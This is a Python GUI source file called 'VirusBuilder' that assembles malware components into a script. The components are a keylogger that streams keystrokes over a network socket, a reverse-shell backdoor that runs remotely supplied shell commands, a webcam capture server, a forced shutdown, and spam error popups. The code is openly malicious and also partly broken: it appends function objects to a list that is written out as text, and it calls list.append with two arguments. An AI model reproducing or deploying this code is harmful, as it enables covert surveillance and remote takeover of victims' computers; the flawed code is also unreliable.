import tkinter as tk
import os
import socket
from tkinter import messagebox

class bcolors:
    GREEN = 'green'
    YELLOW = 'yellow'
    RED = 'red'
    RESET = 'black'

def get_multitool_path():
    if os.name == 'nt':  # Windows
        return os.path.join(os.path.expanduser('~'), 'multitool')
    elif os.name == 'posix':  # Unix/Linux/Mac
        return os.path.join(os.path.expanduser('~'), 'multitool')
    else:
        raise Exception('Unsupported OS')

def create_file(contents):
    multitool_path = get_multitool_path()
    if not os.path.exists(multitool_path):
        os.makedirs(multitool_path)
    file_path = os.path.join(multitool_path, 'combined_actions.py')
    
    with open(file_path, 'w') as file:
        for content in contents:
            file.write(content + "\n")
    
    print(f"File created at {file_path}")

def add_keylogger():
    def keyllogger():
        import os
        import socket
        import threading
        from pynput import keyboard

# Sicherstellen, dass pynput installiert ist
        try:
            import pynput
        except ImportError:
            os.system('pip install pynput')
            from pynput import keyboard

        HOST = "0.0.0.0"  # Hört auf alle Schnittstellen
        PORT = 12345
        clients = []  # Liste aller verbundenen Clients

        def broadcast(message):
            """Sendet die gedrückte Taste an alle Clients"""
            for client in clients:
                try:
                    client.send(message.encode())
                except:
                    client.close()
                    clients.remove(client)

        def keyPressed(key):
            """Wird aufgerufen, wenn eine Taste gedrückt wird"""
            try:
                key_str = key.char if hasattr(key, 'char') else str(key)
                print(f"Taste gedrückt: {key_str}")  # Zeigt es im Server-Terminal an
                broadcast(key_str)
            except:
                print("Error sending key")

        def handle_client(client_socket):
            """Fügt neue Clients zur Liste hinzu"""
            clients.append(client_socket)

        def start_server():
            """Startet den Server"""
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((HOST, PORT))
            server_socket.listen(5)

            print(f"Server gestartet auf {HOST}:{PORT}")

    # Starte den Keylogger
            listener = keyboard.Listener(on_press=keyPressed)
            listener.start()

            while True:
                client_socket, addr = server_socket.accept()
                print(f"Neue Verbindung von {addr}")
                threading.Thread(target=handle_client, args=(client_socket,)).start()

        if __name__ == "__main__":
            start_server()



    
    messagebox.showinfo('Info', 'Keylogger added')
    contents.append(keyllogger)

def add_shutdown_action():
    def shutdown():
        os.system('shutdown -s -t 1')
    messagebox.showinfo("Info", "Shutdown action added")
    contents.append(shutdown)

def add_fake_error_action():
    contents.append('msg * "This is a fake error message"')
    messagebox.showinfo("Info", "Fake error action added")

def add_spam_error_action():
    contents.append('for /L %%i in (1, 1, 10) do msg * "This is a spam error message"')
    messagebox.showinfo("Info", "Spam error action added")

def add_capture_cam():
    try:
        os.system('sudo apt install python3-pip')
        os.system('sudo pip install opencv-python --break-system-packages')
        os.system('sudo pip install OpenCV --break-system-packages')
        import cv2
    except Exception as e:
        print(bcolors.RED + f'Error: {e}' + bcolors.RESET)
    contents.append(capture_cam, Cam_message)

    class Cam_message:
        def __init__(self):
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind(('0.0.0.0', 12345))
            server_socket.listen(1)

            conn, addr = server_socket.accept()
            while True:
                reply = capture_cam()
                conn.send(reply.encode())
    
    def capture_cam():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print('Error: Could not open the webcam')
            exit()
        while True:
            ret, frame = cap.read()
            if not ret:
                print('Error: Could not read frame')
                break
            cv2.imshow('Webcam', frame)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        cv2.destroyAllWindows()



def add_backdoor():
    def Backdoor():
        print(bcolors.RED + 'Warning: You need to open port 80 on your router to make this work' + bcolors.RESET)
        try:
            os.system('sudo apt install python3-pip')
        except Exception as e:
            print(bcolors.RED + f'Error: {e}' + bcolors.RESET)
        import socket
        import subprocess

        contents.append('Backdoor action added')

        def start_server():
            user = input(bcolors.GREEN + 'Please enter the IP address from the host:' + bcolors.RESET)
            host = user
            port = 80
            test = 'Backdoor running!'
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((host, port))
            server_socket.send(str.encode(test))

            while True:
                data = server_socket.recv(2024)
                proc = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout = proc.stdout.read()
                stderr = proc.stderr.read()
                server_socket.send(stderr)
                server_socket.send(stdout)
                print(stdout)
                print(stderr)

        if __name__ == '__main__':
            start_server()
    contents.append(Backdoor)

def save_and_exit():
    create_file(contents)
    root.destroy()

root = tk.Tk()
root.title("VirusBuilder")
root.configure(bg='black')

screen_width = 500
screen_height = 500
root.geometry(f'{screen_width}x{screen_height}')

contents = []


L1 = tk.Label(root, text='VirusBuilder', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', font=("Helvetica", 16, "bold"))
L1.pack(pady=10)


B1 = tk.Button(root, text='Add Fake Error', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_fake_error_action)
B1.pack(pady=10)

B2 = tk.Button(root, text='Add Shutdown', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_shutdown_action)
B2.pack(pady=10)

B3 = tk.Button(root, text='Add Spam Error', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_spam_error_action)
B3.pack(pady=10)

B4 = tk.Button(root, text='Add CaptureCam', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_capture_cam)
B4.pack(pady=10)


B5 = tk.Button(root, text='Add Backdoor', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_backdoor)
B5.pack(pady=10)

B6 = tk.Button(root, text='Add Keylogger', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_keylogger)
B6.pack(pady=10)  # Now it will show up in the window

B7 = tk.Button(root, text='Save & Exit', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=save_and_exit)
B7.pack(pady=10)

root.mainloop()
